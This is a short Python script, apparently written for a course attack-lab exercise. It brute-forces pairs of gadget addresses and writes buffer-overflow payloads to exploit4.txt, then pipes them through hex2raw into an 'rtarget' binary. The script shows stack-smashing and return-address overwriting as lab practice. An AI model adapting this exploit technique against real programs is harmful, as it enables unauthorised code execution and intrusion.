import subprocess as sp
import pdb

for i in range(4201265,4201323):
    for j in range(4201265,4201323):
        d = hex(i)[2:]
        addr1_output = " "
        for i in range(len(d),0,-2):
            addr1_output = addr1_output + d[i-2:i] + " "

        addr1_output = addr1_output + "00 00 00 00 00 "

        d = hex(j)[2:]
        addr2_output = " "
        for i in range(len(d),0,-2):
            addr2_output = addr2_output + d[i-2:i] + " "

        addr2_output = addr2_output + "00 00 00 00 00 "

        pdb.set_trace()
        output = addr1_output + addr2_output

        fill_buffer = ""
        for i in range(1000):
            fill_buffer = fill_buffer + "00 "
        out_buffer = fill_buffer + output + "00 00 00 00"

        text_file = open("exploit4.txt", "w")
        text_file.write("%s" % out_buffer)
        text_file.close()

     #   sp.call(["./hex2raw", "<", "exploit4.txt", "|", "./rtarget"], shell=True)
        with open("exploit4.txt") as inhandle:
            p = sp.Popen("./hex2raw",stdin=inhandle,stdout=sp.PIPE, shell=True)
            p2 = sp.Popen("./rtarget",stdin=p.stdout, shell=True)
            [output,error] = p2.communicate()
            rc2 = p2.wait()
            rc = p.wait()
